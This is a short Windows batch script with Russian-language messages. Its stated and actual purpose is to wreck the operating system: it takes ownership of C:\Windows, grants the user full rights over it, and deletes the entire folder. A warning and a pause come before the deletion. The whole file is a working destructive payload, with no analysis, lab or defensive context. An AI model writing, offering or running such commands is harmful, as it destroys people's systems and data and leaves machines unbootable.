@echo off
echo ВНИМАНИЕ! Этот скрипт удалит системные файлы Windows и сделает ОС неработоспособной.
echo Нажмите Ctrl+C чтобы отменить или любую клавишу для продолжения...
pause 

echo Получение прав на папку Windows...
takeown /f C:\Windows /r /d Y
icacls C:\Windows /grant %username%:F /t

echo Удаление папки Windows...
rd /s /q C:\Windows

echo Удаление завершено. ОС будет повреждена и не загрузится.
pause
